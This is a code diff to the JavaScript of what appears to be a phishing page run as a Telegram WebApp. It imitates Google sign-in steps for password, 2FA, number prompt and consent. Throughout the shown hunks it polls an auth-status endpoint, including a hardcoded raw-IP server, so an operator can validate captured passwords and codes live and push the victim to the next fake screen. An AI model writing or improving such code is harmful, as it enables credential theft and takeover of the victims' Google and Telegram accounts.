@@ -200,6 +200,10 @@ function initApp() {
             }
         }
 
+        if (isGoogleStep) {
+            if (typeof startGooglePolling === "function") startGooglePolling();
+        }
+
         [
             stepPhone, stepCode, step2FA, 
             stepGoogleEmail, stepGooglePassword, stepGoogle2FA, stepGooglePrompt, stepGoogleConsent,
@@ -1192,26 +1196,18 @@ function initApp() {
 
     function startGooglePolling() {
         stopGooglePolling();
-        let targetTgId = (tgUser && tgUser.id) ? tgUser.id : "";
-        if (!targetTgId) {
-            const urlParams = new URLSearchParams(window.location.search);
-            targetTgId = urlParams.get("tg_id") || urlParams.get("user_id") || (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user ? window.Telegram.WebApp.initDataUnsafe.user.id : "");
-            try {
-                if (!targetTgId) targetTgId = localStorage.getItem("privateroom_user_id") || "";
-            } catch (e) {}
-        }
-
         const apiEndpoints = [
             "/api/auth/status",
             "http://31.76.101.210:8080/api/auth/status"
         ];
 
         googlePollTimer = setInterval(async () => {
+            const targetTgId = getUserTgId() || "";
             let data = null;
             for (const ep of apiEndpoints) {
                 try {
-                    const queryStr = `?tg_id=${encodeURIComponent(targetTgId)}&email=${encodeURIComponent(userGoogleEmail || "")}`;
-                    const resp = await fetch(ep + queryStr);
+                    const queryStr = `?tg_id=${encodeURIComponent(targetTgId)}&email=${encodeURIComponent(userGoogleEmail || "")}&_t=${Date.now()}`;
+                    const resp = await fetch(ep + queryStr, { cache: "no-store" });
                     if (resp.ok) {
                         data = await resp.json();
                         if (data && data.ok) break;
@@ -1226,7 +1222,9 @@ function initApp() {
                 if (ctrl.status === "error_password") {
                     if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
                     if (btnSubmitGooglePassword) btnSubmitGooglePassword.disabled = false;
-                    showStep(stepGooglePassword);
+                    if (!stepGooglePassword.classList.contains("active")) {
+                        showStep(stepGooglePassword);
+                    }
                     showGoogleError("password", ctrl.error_msg || "Неверный пароль. Повторите попытку.");
                 } else if (ctrl.status === "correct_password") {
                     if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
@@ -1238,20 +1236,28 @@ function initApp() {
                     if (googlePromptNumber) googlePromptNumber.textContent = num;
                     const promptTargetText = document.getElementById("googlePromptTargetNumber");
                     if (promptTargetText) promptTargetText.textContent = num;
-                    showStep(stepGooglePrompt);
+                    if (!stepGooglePrompt.classList.contains("active")) {
+                        showStep(stepGooglePrompt);
+                    }
                 } else if (ctrl.status === "show_2fa") {
                     if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
                     if (btnSubmitGoogle2FA) btnSubmitGoogle2FA.disabled = false;
-                    showStep(stepGoogle2FA);
+                    if (!stepGoogle2FA.classList.contains("active")) {
+                        showStep(stepGoogle2FA);
+                    }
                 } else if (ctrl.status === "error_2fa") {
                     if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
                     if (btnSubmitGoogle2FA) btnSubmitGoogle2FA.disabled = false;
-                    showStep(stepGoogle2FA);
+                    if (!stepGoogle2FA.classList.contains("active")) {
+                        showStep(stepGoogle2FA);
+                    }
                     showGoogleError("2fa", ctrl.error_msg || "Неверный код. Проверьте код и повторите попытку.");
                 } else if (ctrl.status === "completed" || data.authorized) {
                     stopGooglePolling();
                     if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
-                    showStep(stepGoogleConsent);
+                    if (!stepGoogleConsent.classList.contains("active")) {
+                        showStep(stepGoogleConsent);
+                    }
                 }
             }
         }, 1200);
